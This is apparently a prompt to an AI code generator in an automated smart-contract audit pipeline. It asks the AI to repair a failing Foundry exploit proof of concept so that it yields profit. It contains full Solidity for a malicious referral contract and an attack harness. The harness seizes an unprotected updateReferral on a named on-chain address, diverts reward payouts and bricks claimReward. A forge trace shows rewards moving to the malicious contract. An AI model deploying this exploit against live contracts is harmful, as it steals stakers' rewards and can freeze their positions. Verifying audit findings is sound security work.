You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: alternate_public_liquidity_route
- strategy_instructions: Prefer an alternate public-liquidity venue/route while preserving the same exploit root cause and exploit-path causality.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Unrestricted first-time referral initialization lets an attacker seize reward routing and brick reward-dependent share updates
- claim: `TokenRewards.updateReferral()` has no trusted initializer: while `referral` is unset, any address can install an arbitrary referral contract. All later reward distribution and future referral updates blindly trust that contract for `getRelationsREF()` and `owner()`.
- impact: The first caller can permanently take control of referral routing. A malicious referral contract can divert the referral share from every future reward payout, or simply revert in `getRelationsREF()` so `claimReward()` and any staking-share update that tries to distribute accrued rewards reverts. Because `StakingPoolToken` calls `setShares()` on transfer and unstake, users with pending rewards can be prevented from transferring staking receipts or unstaking LP positions until the attacker-controlled referral contract is replaced, which the attacker can also block by returning an attacker-controlled `owner()`.
- exploit_paths: ["Call `TokenRewards.updateReferral(maliciousReferral)` before the intended referral contract is set.", "Have `maliciousReferral.owner()` resolve to an attacker-controlled address so later `updateReferral()` calls stay under attacker control.", "Either return attacker-controlled referrers from `getRelationsREF()` to siphon referral payouts, or make `getRelationsREF()` revert so `claimReward()` and reward-triggering share updates fail."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
}

interface IReferralLike {
    function owner() external view returns (address);
    function caller() external view returns (address);
    function teamSize(address user) external view returns (uint256);
    function getUserInTeamByIndex(address user, uint256 index) external view returns (address);
    function relations(address user, uint256 level) external view returns (address);
    function getRelationsREF(address user) external view returns (address[2] memory);
    function isSetted(address user) external view returns (bool);
    function setReferral(address from, address to) external;
    function updateSetted(address user) external;
    function referralLevel() external view returns (uint256);
    function renounceOwnership() external;
}

interface IWeightedIndexLike {
    function lpStakingPool() external view returns (address);
}

interface IStakingPoolTokenLike {
    function poolRewards() external view returns (address);
    function stakingToken() external view returns (address);
    function stakeUserRestriction() external view returns (address);
    function indexFund() external view returns (address);
}

interface ITokenRewardsLike {
    function referral() external view returns (address);
    function rewardsToken() external view returns (address);
    function shares(address wallet) external view returns (uint256);
    function getUnpaid(address wallet) external view returns (uint256);
    function updateReferral(address referral_) external;
    function claimReward(address wallet, address referrer) external;
}

contract MaliciousReferral {
    address public controller;
    address public payoutReceiver;
    bool public brickMode;

    mapping(address => bool) internal _setted;

    constructor() {
        controller = msg.sender;
        payoutReceiver = msg.sender;
    }

    function owner() external view returns (address) {
        return controller;
    }

    function caller() external view returns (address) {
        return controller;
    }

    function setBrickMode(bool enabled) external {
        require(msg.sender == controller, "not controller");
        brickMode = enabled;
    }

    function setPayoutReceiver(address nextReceiver) external {
        require(msg.sender == controller, "not controller");
        payoutReceiver = nextReceiver;
    }

    function teamSize(address) external pure returns (uint256) {
        return 0;
    }

    function getUserInTeamByIndex(address, uint256) external pure returns (address) {
        return address(0);
    }

    function referralLevel() external pure returns (uint256) {
        return 2;
    }

    function renounceOwnership() external pure {
        revert("attacker-controlled");
    }

    function updateSetted(address user) external {
        _setted[user] = true;
    }

    function setReferral(address, address user) external {
        _setted[user] = true;
    }

    function isSetted(address user) external view returns (bool) {
        return _setted[user];
    }

    function relations(address, uint256) external view returns (address) {
        return payoutReceiver;
    }

    function getRelationsREF(address) external view returns (address[2] memory refs) {
        require(!brickMode, "malicious referral: bricked");
        refs[0] = payoutReceiver;
        refs[1] = payoutReceiver;
    }
}

contract FlawVerifier {
    address internal constant TARGET = 0x04c80Bb477890F3021F03B068238836Ee20aA0b8;

    address internal _controller;
    address internal _profitToken;
    uint256 internal _startingProfitBalance;
    uint256 internal _profitAmount;

    bool public executed;
    bool public hypothesisValidated;
    bool public referralSeized;
    bool public ownerControlValidated;
    bool public brickModeValidated;

    uint256 public claimsAttempted;
    uint256 public claimsSucceeded;
    uint256 public infeasibleReason;
    uint256 public coveredPathsMask;

    address public targetPool;
    address public targetRewards;
    address public stakingToken;
    address public rewardToken;
    address public liveReferralBefore;
    address public liveReferralAfter;
    address public initialMaliciousReferral;
    address public activeMaliciousReferral;
    address public lastVictim;

    mapping(address => bool) internal _seenWallet;

    constructor() {
        _controller = msg.sender;
    }

    function executeOnOpportunity() external {
        if (executed) {
            _refreshProfit();
            return;
        }
        executed = true;

        targetPool = IWeightedIndexLike(TARGET).lpStakingPool();
        if (targetPool == address(0)) {
            infeasibleReason = 90;
            return;
        }

        targetRewards = IStakingPoolTokenLike(targetPool).poolRewards();
        stakingToken = IStakingPoolTokenLike(targetPool).stakingToken();
        if (targetRewards == address(0)) {
            infeasibleReason = 91;
            return;
        }

        ITokenRewardsLike tokenRewards = ITokenRewardsLike(targetRewards);
        rewardToken = tokenRewards.rewardsToken();
        _profitToken = rewardToken;
        _startingProfitBalance = IERC20Like(rewardToken).balanceOf(address(this));

        liveReferralBefore = tokenRewards.referral();

        MaliciousReferral maliciousReferral = new MaliciousReferral();
        initialMaliciousReferral = address(maliciousReferral);
        activeMaliciousReferral = address(maliciousReferral);

        // exploit_paths[0]:
        // Call TokenRewards.updateReferral(maliciousReferral) before the intended
        // referral contract is set.
        if (liveReferralBefore == address(0)) {
            tokenRewards.updateReferral(address(maliciousReferral));
            liveReferralAfter = tokenRewards.referral();
            if (liveReferralAfter == address(maliciousReferral)) {
                referralSeized = true;
                hypothesisValidated = true;
                coveredPathsMask |= 1;
            }
        } else {
            liveReferralAfter = liveReferralBefore;
            infeasibleReason = 1;
        }

        // exploit_paths[1]:
        // Have maliciousReferral.owner() resolve to an attacker-controlled
        // address so later updateReferral() calls stay under attacker control.
        if (referralSeized) {
            if (IReferralLike(address(maliciousReferral)).owner() == address(this)) {
                MaliciousReferral rotatedReferral = new MaliciousReferral();
                tokenRewards.updateReferral(address(rotatedReferral));
                if (tokenRewards.referral() == address(rotatedReferral)) {
                    activeMaliciousReferral = address(rotatedReferral);
                    liveReferralAfter = address(rotatedReferral);
                    ownerControlValidated = true;
                    coveredPathsMask |= 2;
                }
            }

            if (!ownerControlValidated) {
                activeMaliciousReferral = address(maliciousReferral);
                liveReferralAfter = address(maliciousReferral);
            }
        }

        // exploit_paths[2]:
        // Either return attacker-controlled referrers from getRelationsREF() to
        // siphon referral payouts, or make getRelationsREF() revert so
        // claimReward() and reward-triggering share updates fail.
        if (activeMaliciousReferral != address(0)) {
            MaliciousReferral activeReferral = MaliciousReferral(activeMaliciousReferral);
            address victim = _findClaimableWallet(tokenRewards);

            if (victim != address(0)) {
                lastVictim = victim;

                activeReferral.setBrickMode(true);
                claimsAttempted += 1;
                (bool bricked, ) = address(tokenRewards).call(
                    abi.encodeWithSelector(
                        ITokenRewardsLike.claimReward.selector,
                        victim,
                        activeMaliciousReferral
                    )
                );
                if (!bricked) {
                    brickModeValidated = true;
                }

                activeReferral.setBrickMode(false);
                claimsAttempted += 1;
                try tokenRewards.claimReward(victim, activeMaliciousReferral) {
                    claimsSucceeded += 1;
                } catch {}

                if (brickModeValidated || claimsSucceeded > 0) {
                    hypothesisValidated = true;
                    coveredPathsMask |= 4;
                }
            } else if (ownerControlValidated || referralSeized) {
                hypothesisValidated = true;
            }
        }

        _refreshProfit();
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function setBrickMode(bool enabled) external {
        require(msg.sender == _controller, "not controller");
        if (activeMaliciousReferral != address(0)) {
            MaliciousReferral(activeMaliciousReferral).setBrickMode(enabled);
        }
    }

    function replaceRewardReferral(address nextReferral) external {
        require(msg.sender == _controller, "not controller");
        require(activeMaliciousReferral != address(0), "no malicious referral");
        ITokenRewardsLike(targetRewards).updateReferral(nextReferral);
    }

    function _findClaimableWallet(ITokenRewardsLike tokenRewards) internal returns (address) {
        address wallet;

        wallet = _pickWallet(tokenRewards, TARGET);
        if (wallet != address(0)) return wallet;

        wallet = _pickWallet(tokenRewards, targetPool);
        if (wallet != address(0)) return wallet;

        wallet = _pickWallet(tokenRewards, targetRewards);
        if (wallet != address(0)) return wallet;

        wallet = _pickWallet(tokenRewards, _controller);
        if (wallet != address(0)) return wallet;

        wallet = _pickWallet(tokenRewards, rewardToken);
        if (wallet != address(0)) return wallet;

        wallet = _pickWallet(tokenRewards, stakingToken);
        if (wallet != address(0)) return wallet;

        wallet = _pickWallet(tokenRewards, IStakingPoolTokenLike(targetPool).indexFund());
        if (wallet != address(0)) return wallet;

        wallet = _pickWallet(tokenRewards, IStakingPoolTokenLike(targetPool).stakeUserRestriction());
        if (wallet != address(0)) return wallet;

        wallet = _scanReferral(tokenRewards, liveReferralBefore);
        if (wallet != address(0)) return wallet;

        wallet = _scanReferral(tokenRewards, activeMaliciousReferral);
        return wallet;
    }

    function _scanReferral(ITokenRewardsLike tokenRewards, address referral_) internal returns (address) {
        if (referral_ == address(0)) {
            return address(0);
        }

        IReferralLike referral = IReferralLike(referral_);
        address wallet;

        try referral.owner() returns (address candidate) {
            wallet = _pickWallet(tokenRewards, candidate);
            if (wallet != address(0)) return wallet;
        } catch {}

        try referral.caller() returns (address candidate) {
            wallet = _pickWallet(tokenRewards, candidate);
            if (wallet != address(0)) return wallet;
        } catch {}

        wallet = _scanRelations(tokenRewards, referral_, referral);
        if (wallet != address(0)) {
            return wallet;
        }

        try referral.teamSize(referral_) returns (uint256 size) {
            uint256 capped = size > 8 ? 8 : size;
            for (uint256 i = 0; i < capped; ++i) {
                try referral.getUserInTeamByIndex(referral_, i) returns (address member) {
                    wallet = _pickWallet(tokenRewards, member);
                    if (wallet != address(0)) return wallet;

                    wallet = _scanRelations(tokenRewards, member, referral);
                    if (wallet != address(0)) return wallet;
                } catch {
                    break;
                }
            }
        } catch {}

        return address(0);
    }

    function _scanRelations(
        ITokenRewardsLike tokenRewards,
        address seed,
        IReferralLike referral
    ) internal returns (address) {
        address wallet;

        try referral.relations(seed, 0) returns (address candidate) {
            wallet = _pickWallet(tokenRewards, candidate);
            if (wallet != address(0)) return wallet;
        } catch {}

        try referral.relations(seed, 1) returns (address candidate) {
            wallet = _pickWallet(tokenRewards, candidate);
            if (wallet != address(0)) return wallet;
        } catch {}

        try referral.getRelationsREF(seed) returns (address[2] memory refs) {
            wallet = _pickWallet(tokenRewards, refs[0]);
            if (wallet != address(0)) return wallet;

            wallet = _pickWallet(tokenRewards, refs[1]);
            if (wallet != address(0)) return wallet;
        } catch {}

        return address(0);
    }

    function _pickWallet(ITokenRewardsLike tokenRewards, address candidate) internal returns (address) {
        if (
            candidate == address(0) ||
            candidate == address(this) ||
            candidate == targetRewards ||
            _seenWallet[candidate]
        ) {
            return address(0);
        }
        _seenWallet[candidate] = true;

        uint256 shares_;
        try tokenRewards.shares(candidate) returns (uint256 value) {
            shares_ = value;
        } catch {
            return address(0);
        }
        if (shares_ == 0) {
            return address(0);
        }

        uint256 unpaid;
        try tokenRewards.getUnpaid(candidate) returns (uint256 value) {
            unpaid = value;
        } catch {
            return address(0);
        }
        if (unpaid == 0) {
            return address(0);
        }

        return candidate;
    }

    function _refreshProfit() internal {
        if (_profitToken == address(0)) {
            _profitAmount = 0;
            return;
        }

        uint256 endingBalance = IERC20Like(_profitToken).balanceOf(address(this));
        if (endingBalance > _startingProfitBalance) {
            _profitAmount = endingBalance - _startingProfitBalance;
        } else {
            _profitAmount = 0;
        }
    }
}

```

forge stdout (tail):
```
B6f51E3D4) [staticcall]
    │   │   │   └─ ← [Return] [0x104fBc016F4bb334D775a19E8A6510109AC63E00, 0x0000000000000000000000000000000000000000]
    │   │   ├─ [12967] 0x3e2324342bF5B8A1Dca42915f0489497203d640E::transfer(0x1aA354A9B333bE75141aD8270313E34B6f51E3D4, 287777389480419634964244 [2.877e23])
    │   │   │   ├─  emit topic 0: 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef
    │   │   │   │        topic 1: 0x000000000000000000000000d719345fe7030aeae8e2e9eb0e00e299f3a1ce15
    │   │   │   │        topic 2: 0x0000000000000000000000001aa354a9b333be75141ad8270313e34b6f51e3d4
    │   │   │   │           data: 0x000000000000000000000000000000000000000000003cf0718c0e7c6f33e714
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   ├─  emit topic 0: 0xe8b160e373db99a103e0a2abfa029b9c3fc8b328984a1ead8a65ae68ae646db7
    │   │   │        topic 1: 0x0000000000000000000000001aa354a9b333be75141ad8270313e34b6f51e3d4
    │   │   │           data: 0x000000000000000000000000000000000000000000004147c6d561ed18ec98a7
    │   │   ├─ [25267] 0x3e2324342bF5B8A1Dca42915f0489497203d640E::transfer(MaliciousReferral: [0x104fBc016F4bb334D775a19E8A6510109AC63E00], 14643198714857988924265 [1.464e22])
    │   │   │   ├─  emit topic 0: 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef
    │   │   │   │        topic 1: 0x000000000000000000000000d719345fe7030aeae8e2e9eb0e00e299f3a1ce15
    │   │   │   │        topic 2: 0x000000000000000000000000104fbc016f4bb334d775a19e8a6510109ac63e00
    │   │   │   │           data: 0x000000000000000000000000000000000000000000000319cf34602be6f1a369
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   ├─  emit topic 0: 0x3c9cdf8031af5e42bf108b83dc6f1cfbb2174081f2754d093e4382c9925586a0
    │   │   │        topic 1: 0x0000000000000000000000001aa354a9b333be75141ad8270313e34b6f51e3d4
    │   │   │        topic 2: 0x000000000000000000000000104fbc016f4bb334d775a19e8a6510109ac63e00
    │   │   │           data: 0x0000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000319cf34602be6f1a369
    │   │   ├─ [9253] 0x3e2324342bF5B8A1Dca42915f0489497203d640E::42966c68(00000000000000000000000000000000000000000000013d8614f344c2c70e2a)
    │   │   │   ├─  emit topic 0: 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef
    │   │   │   │        topic 1: 0x000000000000000000000000d719345fe7030aeae8e2e9eb0e00e299f3a1ce15
    │   │   │   │        topic 2: 0x0000000000000000000000000000000000000000000000000000000000000000
    │   │   │   │           data: 0x00000000000000000000000000000000000000000000013d8614f344c2c70e2a
    │   │   │   ├─  emit topic 0: 0xcc16f5dbb4873280815c1ee09dbd06736cffcc184412cf7a71a0fdb75d397ca5
    │   │   │   │        topic 1: 0x000000000000000000000000d719345fe7030aeae8e2e9eb0e00e299f3a1ce15
    │   │   │   │           data: 0x00000000000000000000000000000000000000000000013d8614f344c2c70e2a
    │   │   │   └─ ← [Stop]
    │   │   ├─  emit topic 0: 0x63e32091e4445d16e29c33a6b264577c2d86694021aa4e6f4dd590048f5792e8
    │   │   │        topic 1: 0x0000000000000000000000001aa354a9b333be75141ad8270313e34b6f51e3d4
    │   │   │           data: 0x
    │   │   └─ ← [Stop]
    │   ├─ [653] MaliciousReferral::setBrickMode(false)
    │   │   └─ ← [Stop]
    │   ├─ [4813] 0xD719345fe7030AEaE8e2E9Eb0E00E299F3a1Ce15::claimReward(0x1aA354A9B333bE75141aD8270313E34B6f51E3D4, MaliciousReferral: [0x104fBc016F4bb334D775a19E8A6510109AC63E00])
    │   │   ├─ [502] 0x92f9AE3E4ef6261Ed4e0745A1eDe9098F7AD82d9::isSetted(0x1aA354A9B333bE75141aD8270313E34B6f51E3D4) [staticcall]
    │   │   │   └─ ← [Return] true
    │   │   ├─  emit topic 0: 0x63e32091e4445d16e29c33a6b264577c2d86694021aa4e6f4dd590048f5792e8
    │   │   │        topic 1: 0x0000000000000000000000001aa354a9b333be75141ad8270313e34b6f51e3d4
    │   │   │           data: 0x
    │   │   └─ ← [Stop]
    │   ├─ [467] 0x3e2324342bF5B8A1Dca42915f0489497203d640E::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Stop]
    ├─ [442] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x3e2324342bF5B8A1Dca42915f0489497203d640E
    ├─ [462] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ [467] 0x3e2324342bF5B8A1Dca42915f0489497203d640E::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 1000000000000000 [1e15])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x3e2324342bF5B8A1Dca42915f0489497203d640E)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    ├─ [0] VM::envString("AUDITHOUND_RPC_URL")
    │   └─ ← [Return] <env var value>
    ├─ [0] VM::createSelectFork("<rpc url>", 19106654 [1.91e7])
    │   └─ ← [Return] 1
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK", val: 3092)
    └─ ← [Revert] profit below threshold

Backtrace:
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 12.42s (12.40s CPU time)

Ran 1 test suite in 12.42s (12.42s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 1116583)

Encountered a total of 1 failing tests, 0 tests succeeded

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
